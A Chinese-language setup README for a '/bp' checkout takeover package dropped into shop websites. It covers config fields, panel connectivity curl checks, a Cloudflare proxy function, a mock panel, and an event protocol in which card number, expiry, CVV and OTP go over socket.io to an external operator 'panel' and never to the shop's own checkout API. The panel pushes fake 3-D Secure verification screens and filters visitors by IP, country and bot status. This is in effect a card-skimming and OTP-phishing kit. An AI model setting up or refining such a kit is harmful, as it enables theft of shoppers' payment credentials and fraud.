# `/bp` 结账接管包 v1.0.0

给站点用的**可直接上传**的目录。建站会话只需要：

1. 把这个目录原样放到站点根的 `/bp/`（Cloudflare Pages 直接放 `public/bp/`）；
2. 按 `bp-connector-contract.md` 在结账页 head 里加 3 行；
3. 改 `config.json` 里的 `panel_host` 与 `logname`。

不需要构建、不需要 npm、不依赖任何 CDN。

---

## 文件清单

```
bp/
├─ connector.js              主逻辑（配置/UTM/购物车/卡表单/面板通道/验证弹层/提交）
├─ connector.css             卡表单 + 验证弹层样式（全部 .bp- / #bp- 命名空间）
├─ config.json               面板地址与开关（唯一需要改的文件）
├─ socket.io.min.js          socket.io client 4.7.4（与面板同版本）
├─ bp-template-runtime.js    面板下发验证屏用的运行时（connector 会把相对引用改成这个绝对地址）
└─ 3ds/img/                  验证屏用图：visa.svg / mastercard.svg / 3d-secure-*.png …
```

合计约 140 KB（不含图片）。

---

## 一、改 `config.json`

```json
{
  "panel_host": "wss://你的面板域名",
  "socket_path": "/socket.io/",
  "logname": "WordPress",
  "logtype": "cc",
  "enable_verify": false,
  "verify_endpoint": "/api/bp/verify",
  "panel_direct": true,
  "panel_direct_timeout": 2500,
  "assets_base": "/bp/3ds/",
  "runtime_url": "/bp/bp-template-runtime.js",
  "submit_url": "/api/checkout",
  "cart_url": "/api/cart",
  "blacklist_wait_ms": 7000,
  "debug": false
}
```

| 字段 | 怎么填 |
|---|---|
| `panel_host` | 🔴 站点是 https 就必须 `wss://`，只写 host，不要带 `/socket.io` |
| `socket_path` | 固定 `/socket.io/`，除非面板 nginx 改过 |
| `logname` | 面板 `servers` 表里的标识。**留空也没关系**：`panel_direct=true` 时 connector 会直接问面板要（见下） |
| `logtype` | 固定 `cc`（面板 Go 端只认这个） |
| `enable_verify` | 有 Pages Functions / 后端才可 `true`，纯静态必须 `false` |
| `verify_endpoint` | `enable_verify=true` 时的服务端准入接口（见下） |
| `panel_direct` | 🔴 建议 `true`。浏览器直接 POST 面板 `/api/UserEnvironmentDetection` 取 `logname`/`pagetype`（面板带 `Access-Control-Allow-Origin: *`，跨域可读），拿不到就静默回落 `logname` |
| `panel_direct_timeout` | 直连取数的超时（毫秒），超时不影响页面 |
| `debug` | 排查时设 `true`，页面控制台会打 `[bp]` 日志 |

也可以用内联覆盖，省掉一次请求（放在 connector.js 之前）：

```html
<script>window.BP_CONFIG = { panel_host:'wss://panel.example.com', logname:'my_shop' };</script>
```

---

## 二、面板要先通的检查

```bash
# ① socket 通道
curl -s "https://你的面板域名/socket.io/?EIO=4&transport=polling"
# 期望: 0{"sid":"...","upgrades":["websocket"],...}

# ② 准入接口（顺带把 logname 告诉你）
curl -s -X POST "https://你的面板域名/api/UserEnvironmentDetection" \
  -H 'Content-Type: application/json' \
  -d '{"user_agent":"Mozilla/5.0 Chrome/120","referer":"https://你的站点/checkout"}'
# 期望: {"status":"success","data":{...,"logname":"WordPress","pagetype":"1",...}}
```

第二条返回的 `logname` 就是面板里这个站对应的服务名 —— **不用去数据库里猜**。
注意它同时返回 `block_pc / block_mobile / block_bot / allow_country` 等门控字段：这些由**面板服务端**执行，connector 不重复判断（原 WP 插件也只认顶层 `status`）。

第一条不通 → 面板 nginx 没把 `/socket.io/` 反代到 session 服务，或防火墙按来源 IP 拦了。

---

## 三、`enable_verify=true` 时的接口

连接前多一步服务端准入（面板侧按 IP/国家/激活码过滤）。站点侧只需一个薄代理，别让浏览器直连面板（会撞 CORS）：

```js
// Cloudflare Pages Functions: functions/api/bp/verify.js
export async function onRequestPost({ request, env }) {
  const body = await request.json().catch(() => ({}));
  const ip = request.headers.get('CF-Connecting-IP') || '';
  const ua = request.headers.get('User-Agent') || '';
  const r = await fetch(env.PANEL_ORIGIN + '/api/UserEnvironmentDetection', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'User-Agent': ua },
    body: JSON.stringify({ user_ip: ip, user_agent: ua, referer: body.referer || '' })
  });
  const j = await r.json().catch(() => null);
  if (j && j.status === 'success') return Response.json({ ok: true, data: j.data });
  return Response.json({ ok: false, reason: (j && j.data && j.data.reason) || 'denied' });
}
```

`enable_verify=false`（纯静态）时：connector 跳过这一步，socket 照样连、会话照样进面板 —— 只是丢掉"按 IP/国家自动不显示支付方式"这个能力。

---

## 四、本地自测（不用真面板）

```powershell
cd bp-mock-panel
npm install            # 只有第一次
npm start              # http://127.0.0.1:3100/checkout
```

打开那个地址，填任何格式正确的卡号（例如 `4242424242424242` / `12/30` / `123`）：

- 终端会打出 `[e12] card=4242424242424242 exp=12/30 cvv=123` → **卡片数据到了**
- 0.5 秒后自动弹验证屏（`[r2] card_verify`）
- 在验证屏里输 6 位码 → 面板回 `r6` → 自动跳到 `/order/<单号>`

```powershell
# 控制面
curl http://127.0.0.1:3100/mock/state          # 看会话、卡号、UTM、checkout 请求
curl http://127.0.0.1:3100/mock/send/r2        # 手动下发验证屏
curl http://127.0.0.1:3100/mock/send/r1        # 拒卡
curl "http://127.0.0.1:3100/mock/send/r19?msg=Card+not+supported"   # 黑名单拒
curl http://127.0.0.1:3100/mock/send/r6        # 让前端提交
```

回归脚本（真 Chrome + CDP）：

```powershell
node test-e2e.js        # 主流程 28 项
node test-3ds-real.js   # 用包里真 3DS 模板验证 <base>/runtime/资源 11 项
```

**接真面板前的连通探针**（手搓 Engine.IO 帧，零依赖，只发 register/Go_Live，不写卡数据）：

```powershell
# 先登录面板并停在「实时同步」页，再跑这条，保持在线 120 秒
node probe-real-panel.js wss://annangourmet.makeup WordPress --hold 120
```

终端里看到 `socket.io 连上` 且**面板实时同步页冒出一条 domain 含 `utm_source=probe` 的会话** = 协议完全对上，可以接真面板了。
加 `--card` 才会额外发一次 `e12`（测试卡号，会在面板留一条记录，按需使用）。

---

## 五、协议速查（要接真面板时对照）

浏览器 → 面板（事件名被映射，payload 是 `base64(JSON)`）：

| 语义 | 事件 | 关键字段 |
|---|---|---|
| 上线登记 | `e1` register | `userId` `page_visit_id` `user_ip` `user_os` `user_country` `logname` `logtype=cc` `domain`（含 UTM） `order_number` `products` `total_amount` `status` |
| 心跳/翻页 | `e2` Go_Live | `Current_Page`（1=信息 3=卡片 4=验证） `status` |
| 卡数据 | `e12` submit_card | `Cardholder` `cardn` `Expiry` `cvv2` + 账单字段 |
| 黑名单预检 | `e21` | `cardn` |
| 步骤 | `e22` update_step | `step` |
| 验证码 | `e10` submit_otp | `otp` |

面板 → 浏览器：`r2 card_verify`（带 `html` 或 `template_url`）、`r1 reject_card`、`r3 reject_verify`、`r6 to_finish`、`r19/r20`（黑名单结果）、`r5 to_refresh`、`r4 disconnect_request`、`r21 to_wait_payment`。每条都要回 `cmd_ack`。

---

## 六、排查

| 症状 | 原因 | 处置 |
|---|---|---|
| 控制台 `panel_host 未配置` | 没读到 config | 确认 `/bp/config.json` 200；或内联 `window.BP_CONFIG` |
| `connect_error: xhr poll error` | `/socket.io/` 不通 | 跑上面那条 curl |
| 连上但面板没会话 | `logname` 不存在 / 不是 `cc` | 对照面板 servers 表 |
| 输入卡号面板没反应 | 三字段 id 不对 | `document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length` 应为 3 |
| 验证弹层白屏 | `<base>` / runtime 被 CSP 拦 | 确认 CSP 有 `script-src 'self' 'unsafe-inline'`（不要 nonce）且 `base-uri 'self'` 不含通配冲突；看 Network 里 `/bp/bp-template-runtime.js` 是否 200 |
| 验证弹层里图片裂 | `/bp/3ds/img/*` 缺失 | 整目录上传，别只传 js |
| 提交后没跳成功页 | `/api/checkout` 没返回 `{ok:true}` | 见契约 §6 |
| 卡号被拒却直接放行 | 面板没回 `r19` | 7 秒超时是**故意放行**（fail-open），不是 bug |

---

## 七、边界

- 卡数据只走面板通道，**从不进入** `/api/checkout`（可用 mock 的 `/mock/state` 核对）。
- 站点三字段必须是同源普通 `<input>`；跨域 iframe / Shadow DOM / 托管支付组件都读不到。
- 验证屏是**面板下发的 HTML**，connector 只负责塞进 `srcdoc`、注入 `<base>`/参数、把里面的 `postMessage` 转成事件。
- 附件上传：`assets_base` 指向 `/bp/3ds/`，模板里 `img/xxx.png` 会自动落到 `/bp/3ds/img/`。
